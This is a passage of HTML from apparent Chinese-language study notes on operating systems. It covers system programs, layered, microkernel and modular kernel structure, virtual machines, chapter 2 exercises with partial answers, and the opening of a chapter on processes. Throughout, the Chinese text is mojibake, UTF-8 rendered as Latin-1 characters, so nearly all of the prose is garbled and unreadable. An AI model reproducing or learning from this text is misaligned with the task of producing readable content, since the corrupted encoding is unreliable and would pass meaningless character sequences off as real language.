æœ‰å¤šä¸ªç¼–è¾‘å™¨å¯ä»¥åˆ›å»ºå’Œä¿®æ”¹ä½äºç£ç›˜æˆ–å…¶ä»–å­˜å‚¨è®¾å¤‡ä¸Šçš„æ–‡ä»¶å†…å®¹ã€‚ä¹Ÿå¯èƒ½æœ‰ç‰¹æ®Šçš„å‘½ä»¤è¢«ç”¨äºæŸ¥æ‰¾æ–‡ä»¶å†…å®¹æˆ–å®Œæˆæ–‡æœ¬çš„è½¬æ¢ã€‚</li><li><strong>ç¨‹åºè¯­è¨€æ”¯æŒ</strong>ï¼š å¸¸ç”¨ç¨‹åºè®¾è®¡è¯­è¨€ï¼ˆå¦‚Cã€Cï¼‹ï¼‹ã€Javaã€Visual Basicå’ŒPerlç­‰ã€‰çš„ç¼–è¯‘ç¨‹åºã€æ±‡ç¼–ç¨‹åºã€è°ƒè¯•ç¨‹åºå’Œè§£é‡Šç¨‹åºé€šå¸¸ä¸æ“ä½œç³»ç»Ÿä¸€èµ·æä¾›ç»™ç”¨æˆ·ã€‚</li><li><strong>ç¨‹åºè£…å…¥å’Œæ‰§è¡Œ</strong>ï¼šä¸€æ—¦ç¨‹åºæ±‡ç¼–æˆ–ç¼–è¯‘åï¼Œ å®ƒå¿…é¡»è£…å…¥å†…å­˜æ‰èƒ½æ‰§è¡Œã€‚ç³»ç»Ÿå¯èƒ½è¦æä¾›ç»å¯¹åŠ è½½ç¨‹åºã€é‡å®šä½åŠ è½½ç¨‹åºã€é“¾æ¥ç¼–è¾‘å™¨å’Œè¦†ç›–å¼åŠ è½½ç¨‹åºã€‚ç³»ç»Ÿè¿˜éœ€è¦æœ‰é«˜çº§è¯­è¨€æˆ–æœºå™¨è¯­è¨€çš„è°ƒè¯•ç¨‹åºã€‚</li><li><strong>é€šä¿¡</strong>ï¼šè¿™äº›ç¨‹åºæä¾›äº†åœ¨è¿›ç¨‹ã€ç”¨æˆ·å’Œè®¡ç®—æœºç³»ç»Ÿä¹‹é—´åˆ›å»ºè™šæ‹Ÿè¿æ¥çš„æœºåˆ¶ã€‚å®ƒä»¬å…è®¸ç”¨æˆ·åœ¨äº’ç›¸çš„å±å¹•ä¸Šå‘é€æ¶ˆæ¯ï¼Œ æµè§ˆç½‘é¡µï¼Œ å‘é€ç”µå­é‚®ä»¶ï¼Œ è¿œç¨‹ç™»å½•ï¼Œ ä»ä¸€å°æœºå™¨å‘å¦ä¸€å°æœºå™¨ä¼ é€æ–‡ä»¶ã€‚</li></ul><h3 id="26-æ“ä½œç³»ç»Ÿè®¾è®¡å’Œå®ç°"><a class="markdownIt-Anchor" href="#26-æ“ä½œç³»ç»Ÿè®¾è®¡å’Œå®ç°"></a> 2.6 æ“ä½œç³»ç»Ÿè®¾è®¡å’Œå®ç°</h3><h3 id="261-è®¾è®¡ç›®æ ‡"><a class="markdownIt-Anchor" href="#261-è®¾è®¡ç›®æ ‡"></a> 2.6.1 è®¾è®¡ç›®æ ‡</h3><h3 id="262-æœºåˆ¶ä¸ç­–ç•¥"><a class="markdownIt-Anchor" href="#262-æœºåˆ¶ä¸ç­–ç•¥"></a> 2.6.2 æœºåˆ¶ä¸ç­–ç•¥</h3><h3 id="263-å®ç°"><a class="markdownIt-Anchor" href="#263-å®ç°"></a> 2.6.3 å®ç°</h3><h2 id="27-æ“ä½œç³»ç»Ÿç»“æ„"><a class="markdownIt-Anchor" href="#27-æ“ä½œç³»ç»Ÿç»“æ„"></a> 2.7 æ“ä½œç³»ç»Ÿç»“æ„</h2><h4 id="271-ç®€å•ç»“æ„"><a class="markdownIt-Anchor" href="#271-ç®€å•ç»“æ„"></a> 2.7.1 ç®€å•ç»“æ„</h4><p><img src="/posts/8ce3e425/image-20211114121729295.png" alt="image-20211114121729295"></p><p><img src="/posts/8ce3e425/image-20211114121720130.png" alt="image-20211114121720130"></p><h4 id="272-åˆ†å±‚æ–¹æ³•"><a class="markdownIt-Anchor" href="#272-åˆ†å±‚æ–¹æ³•"></a> 2.7.2 åˆ†å±‚æ–¹æ³•</h4><ul><li><p>æ“ä½œç³»ç»Ÿè¢«åˆ’åˆ†ä¸ºè‹¥å¹²å±‚çº§ï¼Œæ¯ä¸€å±‚éƒ½å»ºç«‹åœ¨è¾ƒä½å±‚ä¹‹ä¸Š</p></li><li><p>æ¨¡å—åŒ–</p></li></ul><p><img src="/posts/8ce3e425/image-20211114122235688.png" alt="image-20211114122235688"></p><ul><li><p>ä¼˜ç‚¹</p><ul><li>ä¾¿äºæ„é€ å’Œè°ƒè¯•  ç®€åŒ–ç³»ç»Ÿè®¾è®¡å’Œå®ç°</li></ul></li><li><p>ä¸è¶³</p><ul><li>å®šä¹‰å’Œåˆ’åˆ†å›°éš¾  æ•ˆç‡ç›¸å¯¹è¦ä½ä¸€äº›</li></ul></li></ul><h4 id="273-å¾®å†…æ ¸"><a class="markdownIt-Anchor" href="#273-å¾®å†…æ ¸"></a> 2.7.3 å¾®å†…æ ¸</h4><ul><li><p>è¿™ç§æ–¹æ³•å°†æ‰€æœ‰éåŸºæœ¬éƒ¨åˆ†ä»å†…æ ¸ä¸­ç§»èµ°ï¼Œå¹¶å°†å®ƒä»¬å½“åšç³»ç»Ÿçº§ç¨‹åºå’Œç”¨æˆ·çº§ç¨‹åºæ¥å®ç°ï¼Œç”¨è¿™ç§æ–¹æ³•æ¥æ„å»ºæ“ä½œç³»ç»Ÿ</p></li><li><p>ç”¨æˆ·æ¨¡å—ä¹‹é—´é‡‡ç”¨æ¶ˆæ¯ä¼ é€’çš„æ–¹å¼è¿›è¡Œé€šä¿¡</p></li><li><p>ä¼˜ç‚¹</p><ul><li>å¾®å†…æ ¸æ˜“äºæ‰©å±•</li><li>æ˜“äºæå‡OSè‡³ä¸€ä¸ªæ–°çš„ä½“ç³»ç»“æ„</li><li>æ›´å¯é ï¼ˆå†…æ ¸æ¨¡å¼ä¸­è¿è¡Œçš„ä»£ç æ›´å°‘ï¼‰</li><li>æ›´å®‰å…¨</li></ul></li><li><p>ç¼ºç‚¹</p><ul><li>ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´çš„é€šä¿¡ä»£ä»·è¾ƒé«˜</li></ul></li></ul><h4 id="274-æ¨¡å—"><a class="markdownIt-Anchor" href="#274-æ¨¡å—"></a> 2.7.4 æ¨¡å—</h4><p>ç”¨é¢å‘å¯¹è±¡ç¼–ç¨‹æŠ€æœ¯æ¥ç”Ÿæˆæ¨¡å—åŒ–çš„å†…æ ¸ã€‚è¿™é‡Œï¼Œ å†…æ ¸æœ‰ä¸€ç»„æ ¸å¿ƒéƒ¨ä»¶ï¼Œ ä»¥åŠåœ¨å¯åŠ¨æˆ–è¿è¡Œæ—¶å¯¹é™„åŠ æœåŠ¡çš„åŠ¨æ€é“¾æ¥ã€‚</p><ul><li>ç”¨é¢å‘å¯¹è±¡çš„æ–¹æ³•</li><li>å†…æ ¸çš„ç»„æˆéƒ¨åˆ†ç›¸äº’åˆ†ç¦»</li><li>ä»»åŠ¡ä¹‹é—´çš„äº¤äº’é€šè¿‡å·²çŸ¥çš„æ¥å£æ¥å®ç°</li><li>æ¯ä¸ªæ¨¡å—åœ¨å†…æ ¸ä¸­æ˜¯æŒ‰ç…§éœ€è¦å¯è£…è½½çš„</li><li>æ¯”åˆ†å±‚ç³»ç»Ÿæ›´ä¸ºçµæ´»</li><li>æ¯”å¾®å†…æ ¸æ›´é«˜æ•ˆï¼ˆä¸éœ€è¦è°ƒç”¨æ¶ˆæ¯ä¼ é€’æ¥é€šä¿¡ï¼‰</li></ul><p><img src="/posts/8ce3e425/image-20211114122827683.png" alt="image-20211114122827683"></p><h2 id="28-è™šæ‹Ÿæœº"><a class="markdownIt-Anchor" href="#28-è™šæ‹Ÿæœº"></a> 2.8 è™šæ‹Ÿæœº</h2><h3 id="281-å®ç°"><a class="markdownIt-Anchor" href="#281-å®ç°"></a> 2.8.1 å®ç°</h3><p>è™šæ‹Ÿæœºæ˜¯.é€šè¿‡è½¯ä»¶æ¨¡æ‹Ÿçš„å…·æœ‰å®Œæ•´ç¡¬ä»¶ç³»ç»ŸåŠŸèƒ½çš„ã€è¿è¡Œåœ¨ä¸€ä¸ªå®Œå…¨éš”ç¦»ç¯å¢ƒä¸­çš„å®Œæ•´è®¡ç®—æœºç³»ç»Ÿã€‚</p><p>è™šæ‹Ÿæœºçš„åŸºæœ¬æ€æƒ³æ˜¯å•ä¸ªè®¡ç®—æœº(CPUã€ å†…å­˜ã€ ç£ç›˜ã€ ç½‘å¡ç­‰ã€‰çš„ç¡¬ä»¶æŠ½è±¡ä¸ºå‡ ä¸ªä¸åŒçš„æ‰§è¡Œéƒ¨ä»¶ï¼Œ ä»è€Œé€ æˆä¸€ç§ â€œ å¹»è§‰ï¼Œä»¿ä½›æ¯ä¸ªç‹¬ç«‹çš„æ‰§è¡Œç¯å¢ƒéƒ½åœ¨è‡ªå·±çš„è®¡ç®—æœºä¸Šè¿è¡Œä¸€æ ·ã€‚</p><ul><li>è™šæ‹Ÿæœºé‡‡ç”¨äº†åˆ†å±‚çš„æ–¹æ³•ã€‚å®ƒå°†ç‰©ç†ç¡¬ä»¶å’ŒOSå†…æ ¸ç»Ÿä¸€çœ‹ä½œä¸ºç¡¬ä»¶</li><li>è™šæ‹Ÿæœºæä¾›äº†ä¸åŸºæœ¬ç¡¬ä»¶ç›¸åŒçš„æ¥å£</li><li>é€šè¿‡åˆ©ç”¨CPUè°ƒåº¦å’Œè™šæ‹Ÿå†…å­˜æŠ€æœ¯ï¼Œæ“ä½œç³»ç»Ÿèƒ½åˆ›å»ºä¸€ç§â€œå¹»è§‰â€ï¼Œä»¥è‡³äºè¿›ç¨‹è®¤ä¸ºæœ‰è‡ªå·±çš„å¤„ç†å™¨å’Œè‡ªå·±çš„ï¼ˆè™šæ‹Ÿï¼‰å†…å­˜ã€‚</li></ul><h3 id="282-ä¼˜ç‚¹"><a class="markdownIt-Anchor" href="#282-ä¼˜ç‚¹"></a> 2.8.2 ä¼˜ç‚¹</h3><ul><li>é€šè¿‡å®Œå…¨ä¿æŠ¤ç³»ç»Ÿèµ„æºï¼Œè™šæ‹Ÿæœºæä¾›äº†ä¸€ä¸ªåšå®çš„å®‰å…¨å±‚</li><li>è™šæ‹Ÿæœºå…è®¸è¿›è¡Œç³»ç»Ÿå¼€å‘è€Œä¸å¿…ä¸­æ–­æ­£å¸¸çš„ç³»ç»Ÿæ“ä½œ</li></ul><p>ç¼ºç‚¹</p><ul><li>è™šæ‹Ÿæœºæ¦‚å¿µå¾ˆéš¾æä¾›çœŸå®çš„ç¡¬ä»¶æ•ˆæœ</li></ul><h3 id="283-å®ä¾‹"><a class="markdownIt-Anchor" href="#283-å®ä¾‹"></a> 2.8.3 å®ä¾‹</h3><h2 id="29-ç³»ç»Ÿç”Ÿæˆ"><a class="markdownIt-Anchor" href="#29-ç³»ç»Ÿç”Ÿæˆ"></a> 2.9 ç³»ç»Ÿç”Ÿæˆ</h2><h2 id="210-ç³»ç»Ÿå¯åŠ¨"><a class="markdownIt-Anchor" href="#210-ç³»ç»Ÿå¯åŠ¨"></a> 2.10 ç³»ç»Ÿå¯åŠ¨</h2><h2 id="211-å°ç»“"><a class="markdownIt-Anchor" href="#211-å°ç»“"></a> 2.11 å°ç»“</h2><h2 id="212-ä¹ é¢˜"><a class="markdownIt-Anchor" href="#212-ä¹ é¢˜"></a> 2.12 ä¹ é¢˜</h2><p><strong>2.1 æ“ä½œç³»ç»Ÿæä¾›çš„æœåŠ¡å’ŒåŠŸèƒ½å¯ä»¥ä¸»è¦åˆ†ä¸ºä¸¤å¤§ç±»ã€‚ç®€è¦æè¿°è¿™ä¸¤å¤§ç±»å¹¶è®¨è®ºå®ƒä»¬çš„åŒºåˆ«ã€‚</strong></p><blockquote><p>ç¬¬ä¸€ç§æ“ä½œç³»ç»Ÿæä¾›çš„æœåŠ¡æ˜¯<strong>ç”¨æ¥ä¿æŠ¤åœ¨ç³»ç»Ÿä¸­åŒæ—¶è¿è¡Œçš„ä¸åŒè¿›ç¨‹</strong>ã€‚è¿›ç¨‹åªè¢«å…è®¸è·å¾—ä¸å®ƒä»¬åœ°å€ç©ºé—´æœ‰è”ç³»çš„å†…å­˜ä½ç½®ã€‚åŒæ ·ï¼Œè¿›ç¨‹ä¸å…è®¸ç ´åå’Œå…¶ä»–ç”¨æˆ·æœ‰å…³çš„æ–‡ä»¶ã€‚ä¸€ä¸ªè¿›ç¨‹åŒæ ·ä¸å…è®¸åœ¨æ²¡æœ‰æ“ä½œç³»ç»Ÿçš„å¹²é¢„<br>ä¸‹ç›´æ¥è¿›å…¥è®¾å¤‡ã€‚</p><p>ç¬¬äºŒç§æœåŠ¡ç”±æ“ä½œç³»ç»Ÿæä¾›çš„æœåŠ¡æ˜¯<strong>æä¾›ä¸€ç§æ–°çš„åŠŸèƒ½ï¼Œè€Œè¿™ç§åŠŸèƒ½å¹¶ä¸ç›´æ¥è¢«åº•å±‚çš„ç¡¬ä»¶æ”¯æŒ</strong>ã€‚è™šæ‹Ÿå­˜å‚¨å™¨å’Œæ–‡ä»¶ç³»ç»Ÿå°±æ˜¯ç”±æ“ä½œç³»ç»Ÿæä¾›çš„è¿™ç§æ–°æœåŠ¡çš„å®ä¾‹ã€‚</p></blockquote><p><strong>2.2 åˆ—å‡ºæ“ä½œç³»ç»Ÿæä¾›ä½¿ç”¨æˆ·æ›´ä¸ºæ–¹ä¾¿åœ°ä½¿ç”¨è®¡ç®—æœºç³»ç»Ÿçš„5ä¸ªæœåŠ¡ï¼Œå¹¶è¯´æ˜åœ¨å“ªäº›æƒ…å†µä¸‹ç”¨æˆ·çº§ç¨‹åºä¸èƒ½å¤Ÿæä¾›è¿™äº›æœåŠ¡ã€‚è¯·è§£é‡Šä¸ºä»€ä¹ˆã€‚</strong></p><blockquote><p>2.1æ“ä½œç³»ç»ŸæœåŠ¡</p></blockquote><p><strong>2.3 ç»™å‡ºä¸‰ç§å‘æ“ä½œç³»ç»Ÿä¼ é€’å‚æ•°çš„å¸¸ç”¨æ–¹æ³•ã€‚</strong></p><blockquote><ol><li>é€šè¿‡å¯„å­˜å™¨æ¥ä¼ é€’å‚æ•°</li><li>å¯„å­˜å™¨ä¼ é€’å‚æ•°å—çš„é¦–åœ°å€</li><li>å‚æ•°é€šè¿‡ç¨‹åºå­˜æ”¾æˆ–å‹è¿›å †æ ˆä¸­ï¼Œ å¹¶é€šè¿‡æ“ä½œç³»ç»Ÿå¼¹å‡ºå †æ ˆã€‚</li></ol></blockquote><p><strong>2.4 ä»‹ç»ä¸€ä¸‹å¦‚ä½•è·å¾—ä¸€ä¸ªç¨‹åºåœ¨æ‰§è¡Œå…¶ä¸åŒéƒ¨åˆ†çš„ä»£ç æ—¶æ‰€è€—æ—¶é—´çš„ç»Ÿè®¡ç®€è¡°ã€‚è®¨è®ºè·å¾—è¯¥ç»Ÿè®¡ç®€è¡¨çš„é‡è¦æ€§ã€‚</strong></p><p><strong>2.5 æ“ä½œç³»ç»Ÿå…³äºæ–‡ä»¶ç®¡ç†çš„5ä¸ªä¸»è¦åŠŸèƒ½æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><blockquote><p>2.4.2</p></blockquote><p><strong>2.6 æ“ä½œæ–‡ä»¶å’Œè®¾å¤‡æ—¶ï¼Œé‡‡ç”¨åŒæ ·çš„ç³»ç»Ÿè°ƒç”¨ç•Œé¢æœ‰ä»€ä¹ˆä¼˜ç‚¹å’Œç¼ºç‚¹ï¼Ÿ</strong></p><p><strong>2.7 å‘½ä»¤è§£é‡Šå™¨çš„ç”¨é€”æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆå®ƒç»å¸¸æ˜¯ä¸å†…æ ¸åˆ†å¼€çš„ï¼Ÿæ˜¯å¦å¯èƒ½é‡‡ç”¨æ“ä½œç³»ç»Ÿæä¾›çš„ç³»ç»Ÿè°ƒç”¨æ¥å£ä¸ºç”¨æˆ·å¼€å‘ä¸€ä¸ªæ–°çš„å‘½ä»¤è§£é‡Šå™¨ï¼Ÿ</strong></p><p><strong>ï¼ï¼ï¼2.8 è¿›ç¨‹é—´é€šä¿¡çš„ä¸¤ä¸ªæ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿè¿™ä¸¤ç§æ–¹æ³•æœ‰ä½•é•¿å¤„å’Œç¼ºç‚¹ï¼Ÿ</strong></p><blockquote><p>å…±äº«å†…å­˜ç³»ç»Ÿ</p><ul><li><p>ä¼˜ç‚¹</p><ul><li>æœ€å¿«çš„ä¸€ç§é€šä¿¡æ–¹å¼ï¼Œå¤šä¸ªè¿›ç¨‹å¯åŒæ—¶è®¿é—®åŒä¸€ç‰‡å†…å­˜ç©ºé—´ï¼Œç›¸å¯¹å…¶ä»–æ–¹å¼æ¥è¯´å…·æœ‰æ›´å°‘çš„æ•°æ®æ‹·è´ï¼Œæ•ˆç‡è¾ƒé«˜ã€‚</li><li>éšå†…æ ¸æŒç»­ï¼Œç›¸æ¯”äºéšè¿›ç¨‹æŒç»­ç”Ÿå‘½åŠ›æ›´å¼ºã€‚</li></ul></li><li><p>ç¼ºç‚¹</p><p>éœ€è¦ç»“åˆä¿¡å·é‡</p><p>æˆ–å…¶ä»–æ–¹å¼æ¥å®ç°å¤šä¸ªè¿›ç¨‹é—´åŒæ­¥ï¼Œè‡ªèº«ä¸å…·å¤‡åŒæ­¥æœºåˆ¶ã€‚</p></li></ul><p>æ¶ˆæ¯ä¼ é€’ç³»ç»Ÿ</p><ul><li>ä¼˜ç‚¹<ul><li>å¯ä»¥å®ç°é€šä¿¡è¿›ç¨‹é—´çš„åŒæ­¥</li></ul></li><li>ç¼ºç‚¹<ul><li>æ•ˆç‡è¾ƒä½</li></ul></li></ul></blockquote><p><strong>2.9 ä¸ºä»€ä¹ˆè¦å°†æœºåˆ¶å’Œç­–ç•¥åŒºåˆ†å¼€æ¥ï¼Ÿ</strong></p><p><strong>2.10 ä¸ºä»€ä¹ˆJavaæä¾›ä»Javaç¨‹åºè°ƒç”¨ä»¥Cæˆ–Cï¼‹ï¼‹ç¼–å†™çš„æœ¬åœ°æ–¹æ³•ï¼Ÿä¸¾å‡ºä¸€ä¸ªæœ¬åœ°æ–¹æ³•çš„ä¾‹å­ã€‚</strong></p><p><strong>2.11 å¦‚æœæ“ä½œç³»ç»Ÿçš„ä¸¤ä¸ªéƒ¨ä»¶ç›¸äº’ä¾èµ–ï¼Œæœ‰æ—¶å®ç°åˆ†å±‚æ–¹æ³•ä¼šå¾ˆå›°éš¾ï¼ è¯·åŒºåˆ«ä¸¤ä¸ªåŠŸèƒ½ç´§å¯†è€¦åˆçš„ç³»ç»Ÿéƒ¨ä»¶å¦‚ä½•åˆ†å±‚ã€‚</strong></p><p><strong>ï¼ï¼ï¼2.12 ç³»ç»Ÿè®¾è®¡é‡‡ç”¨å¾®å†…æ ¸è®¾è®¡çš„ä¸»è¦ä¼˜ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿç”¨æˆ·ç¨‹åºå’Œç³»ç»ŸæœåŠ¡åœ¨å¾®å†…æ ¸ç»“æ„å†…å¦‚ä½•ç›¸äº’å½±å“ï¼Ÿé‡‡ç”¨å¾®å†…æ ¸è®¾è®¡çš„ç¼ºç‚¹åˆæ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><blockquote><p>ä¼˜ç‚¹ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li><p><strong>çµæ´»æ€§é«˜æ˜“æ‹“å±•</strong>,å¢åŠ ä¸€ä¸ªæ–°çš„æœåŠ¡ä¸éœ€è¦ä¿®æ”¹å†…æ ¸</p></li><li><p>åœ¨ç”¨æˆ·æ¨¡å¼ä¸­ä¸­æ¯”åœ¨å†…æ ¸æ¨¡å¼ä¸­<strong>æ›´å®‰å…¨</strong>ã€æ›´æ˜“æ“ä½œ</p></li><li><p>ä¸€ä¸ªç®€å•çš„å†…æ ¸è®¾è®¡å’ŒåŠŸèƒ½ä¸€èˆ¬å¯¼è‡´ä¸€ä¸ª<strong>æ›´å¯é </strong>çš„æ“ä½œç³»ç»Ÿ</p></li><li><p><strong>å¯ç§»æ¤æ€§å¼º</strong></p></li><li><p>æ˜“äºæå‡OSè‡³ä¸€ä¸ªæ–°çš„ä½“ç³»ç»“æ„</p></li></ul><p>ç”¨æˆ·ç¨‹åºå’Œç³»ç»ŸæœåŠ¡é€šè¿‡ä½¿ç”¨è¿›ç¨‹ä»¶çš„é€šä¿¡æœºåˆ¶åœ¨å¾®å†…æ ¸ä¸­ç›¸äº’ä½œç”¨ï¼Œä¾‹å¦‚å‘é€æ¶ˆæ¯ã€‚è¿™äº›æ¶ˆæ¯ç”±æ“ä½œç³»ç»Ÿè¿é€ã€‚</p><p>ç¼ºç‚¹æ˜¯</p><ul><li>ä¸è¿›ç¨‹é—´é€šä¿¡çš„è¿‡åº¦è”ç³»å’Œä¸ºäº†ä¿è¯ç”¨æˆ·ç¨‹åºå’Œç³»ç»ŸæœåŠ¡ç›¸äº’ä½œç”¨è€Œé¢‘ç¹ä½¿ç”¨æ“ä½œç³»ç»Ÿçš„æ¶ˆæ¯ä¼ é€’åŠŸèƒ½ã€‚ä½¿å¾—<strong>æ•ˆç‡è¾ƒä½</strong></li></ul></blockquote><p><strong>2.13 æ¨¡å—åŒ–å†…æ ¸æ–¹æ³•å’Œåˆ†å±‚æ–¹æ³•åœ¨å“ªäº›æ–¹é¢ç±»ä¼¼ï¼Ÿå“ªäº›æ–¹é¢ä¸åŒï¼Ÿ</strong></p><blockquote><p>äºŒè€…çš„ç›¸ä¼¼ä¹‹å¤„åœ¨äºå®ç°äº†ç³»ç»Ÿçš„æ¨¡å—åŒ–è®¾è®¡ï¼Œæ¯ä¸€éƒ¨åˆ†éƒ½å¯¹å¤–æä¾›æ¥å£ï¼Œä¾¿äºå¯¹ç³»ç»Ÿè¿›è¡Œç»´æŠ¤å’Œä¿®æ”¹ã€‚</p><p>äºŒè€…çš„åŒºåˆ«åœ¨äºæ¨¡å—åŒ–å†…æ ¸æ–¹æ³•æ¯”åˆ†å±‚æ–¹æ³•æ›´ä¸ºçµæ´»ï¼Œå®ƒçš„ä»»ä¸€æ¨¡å—éƒ½èƒ½è°ƒç”¨ä»»ä½•å…¶ä»–æ¨¡å—ï¼Œæé«˜äº†ç³»ç»Ÿæ•ˆç‡ï¼›è€Œåˆ†å±‚æ–¹æ³•é€šè¿‡å±‚å±‚çš„ç³»ç»Ÿè°ƒç”¨å®ç°ä¸Šå±‚ä¸ä¸‹å±‚æ¨¡å—ä¹‹é—´çš„é€šä¿¡ï¼Œå¢åŠ äº†ç³»ç»Ÿå¼€é”€ã€‚</p></blockquote><p><strong>2.14 æ“ä½œç³»ç»Ÿè®¾è®¡å‘˜é‡‡ç”¨è™šæ‹Ÿæœºç»“æ„çš„ä¸»è¦ä¼˜ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿå¯¹ç”¨æˆ·æ¥è¯´ä¸»è¦æœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ</strong></p><p><strong>2.15 ä¸ºä»€ä¹ˆè¯´ä¸€ä¸ªTIT (just-in-timeï¼‰ç¼–è¯‘å™¨å¯¹æ‰§è¡Œä¸€ä¸ªJavaç¨‹åºæ˜¯æœ‰ç”¨çš„ï¼Ÿ</strong></p><p><strong>2.16 åœ¨VMwareè¿™æ ·çš„ç³»ç»Ÿä¸­ï¼Œå®¢æˆ·æ“ä½œç³»ç»Ÿä¸ä¸»æ“ä½œç³»ç»Ÿæœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿé€‰æ‹©ä¸»æ“ä½œç³»ç»Ÿè¦è€ƒè™‘ä»€ä¹ˆå› ç´ ï¼Ÿ</strong></p><h1 id="ç¬¬3ç« -è¿›ç¨‹"><a class="markdownIt-Anchor" href="#ç¬¬3ç« -è¿›ç¨‹"></a> ç¬¬3ç«  è¿›ç¨‹</h1><h2 id="31-è¿›ç¨‹æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#31-è¿›ç¨‹æ¦‚å¿µ"></a> 3.1 è¿›ç¨‹æ¦‚å¿µ</h2><h3 id="311-è¿›ç¨‹"><a class="markdownIt-Anchor" href="#311-è¿›ç¨‹"></a> 3.1.1 è¿›ç¨‹</h3><p><strong>è¿›ç¨‹</strong>ï¼šæ˜¯ä¸€ä¸ªå¯å¹¶å‘æ‰§è¡Œçš„å…·æœ‰ç‹¬ç«‹åŠŸèƒ½çš„ç¨‹åºå…³äºæŸä¸ªæ•°æ®é›†åˆçš„ä¸€æ¬¡æ‰§è¡Œè¿‡ç¨‹ï¼Œä¹Ÿæ˜¯æ“ä½œç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œä¿æŠ¤çš„åŸºæœ¬å•ä½ã€‚</p><p><strong>è¿›ç¨‹å’Œç¨‹åºçš„åŒºåˆ«</strong></p><ul><li><p><strong>è¿›ç¨‹</strong>åæ˜ çš„æ˜¯ä¸€ä¸ªåŠ¨æ€æ¦‚å¿µï¼Œè€Œ<strong>ç¨‹åº</strong>æ˜¯ä¸€ä¸ªé™æ€æ¦‚å¿µï¼›ç¨‹åºæ˜¯æŒ‡ä»¤çš„æœ‰åºé›†åˆï¼Œæ²¡æœ‰ä»»ä½•æ‰§è¡Œçš„å«ä¹‰ï¼Œè€Œè¿›ç¨‹åˆ™å¼ºè°ƒçš„æ˜¯æ‰§è¡Œè¿‡ç¨‹ï¼Œå®ƒåŠ¨æ€è¢«åˆ›å»ºã€æ‰§è¡Œå’Œæ¶ˆäº¡ã€‚</p></li><li><p><strong>è¿›ç¨‹</strong>æ˜¯ä¸€ä¸ªèƒ½ç‹¬ç«‹è¿è¡Œçš„å•ä½ï¼Œèƒ½ä¸å…¶ä»–è¿›ç¨‹å¹¶å‘æ‰§è¡Œï¼Œè¿›ç¨‹æ˜¯ä½œä¸ºèµ„æºç”³è¯·å’Œè°ƒåº¦å•ä½å­˜åœ¨çš„ã€‚è€Œ<strong>ç¨‹åº</strong>åˆ™æ²¡æœ‰ã€‚å› ä¸ºç¨‹åºä¸åæ˜ æ‰§è¡Œè¿‡ç¨‹ã€‚</p></li><li><p>ç¨‹åºå’Œè¿›ç¨‹å¹¶ä¸ä¸€å®šå…·æœ‰ä¸€ä¸€å¯¹åº”çš„å…³ç³»ã€‚ä¸åŒçš„è¿›ç¨‹å¯ä»¥æ¥è‡ªäºåŒä¸€ç¨‹åºï¼Œåªè¦è¯¥ç¨‹åºæ‰€å¯¹åº”çš„æ•°æ®é›†ä¸åŒã€‚</p></li></ul><p>è¿›ç¨‹åŒ…æ‹¬æ–‡æœ¬æ®µã€å †æ ˆæ®µï¼ˆåŒ…æ‹¬ä¸´æ—¶æ•°æ®ï¼Œå¦‚å‡½æ•°å‚æ•°ã€è¿”å›åœ°å€å’Œå±€éƒ¨å˜é‡ï¼‰ã€æ•°æ®æ®µï¼ˆåŒ…æ‹¬å…¨å±€å˜é‡ï¼‰ã€å †ï¼ˆè¿›ç¨‹è¿è¡Œæ—¶åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼‰</p><p><img src="/posts/8ce3e425/image-20210622073331434.png" alt="image-20210622073331434"></p><p><img src="/posts/8ce3e425/image-20211024142834120.png" alt="å†…å­˜ä¸­çš„è¿›ç¨‹"></p><p><strong>è¿›ç¨‹çš„å†…å­˜æ˜ åƒï¼š</strong></p><p><img src="/posts/8ce3e425/image-20220109122113919.png" alt="image-20220109122113919"></p><h3 id="312-è¿›ç¨‹çŠ¶æ€"><a class="markdownIt-Anchor" href="#312-è¿›ç¨‹çŠ¶æ€"></a> 3.1.2 è¿›ç¨‹çŠ¶æ€</h3><p>è¿›ç¨‹åœ¨æ‰§è¡Œæ—¶ä¼šæ”¹å˜çŠ¶æ€ã€‚è¿›ç¨‹çŠ¶æ€åœ¨æŸç§ç¨‹åº¦ä¸Šæ˜¯ç”±å½“å‰æ´»åŠ¨æ‰€å®šä¹‰çš„ã€‚æ¯ä¸ªè¿›ç¨‹å¯èƒ½å¤„äºä¸‹åˆ—çŠ¶æ€ä¹‹ä¸€ï¼š</p><ul><li>æ–°çš„ï¼šè¿›ç¨‹æ­£åœ¨è¢«åˆ›å»ºã€‚</li><li>è¿è¡Œï¼š æŒ‡ä»¤æ­£åœ¨è¢«æ‰§è¡Œã€‚</li><li>ç­‰å¾…ï¼šè¿›ç¨‹ç­‰å¾…æŸä¸ªäº‹ä»¶çš„å‘ç”Ÿï¼ˆå¦‚I/Oå®Œæˆæˆ–æ”¶åˆ°ä¿¡å·ï¼‰ã€‚</li><li>å°±ç»ªï¼šè¿›ç¨‹ç­‰å¾…åˆ†é…å¤„ç†å™¨ã€‚</li><li>ç»ˆæ­¢ï¼šè¿›ç¨‹å®Œæˆæ‰§è¡Œã€‚</li></ul><p><img src="/posts/8ce3e425/image-20211024144135058.png" alt="image-20211024144135058"></p><h3 id="313-è¿›ç¨‹æ§åˆ¶å—"><a class="markdownIt-Anchor" href="#313-è¿›ç¨‹æ§åˆ¶å—"></a> 3.1.3 è¿›ç¨‹æ§åˆ¶å—</h3><p>æ¯ä¸ªè¿›ç¨‹åœ¨æ“ä½œç³»ç»Ÿå†…ç”¨è¿›ç¨‹æ§åˆ¶å—ï¼ˆprocess control block, PCB ï¼Œä¹Ÿç§°ä¸ºä»»åŠ¡æ§åˆ¶å—ï¼‰æ¥è¡¨ç¤ºã€‚</p><p>å›¾3.3 ç»™å‡ºäº†ä¸€ä¸ªPCB çš„ä¾‹å­ï¼Œ 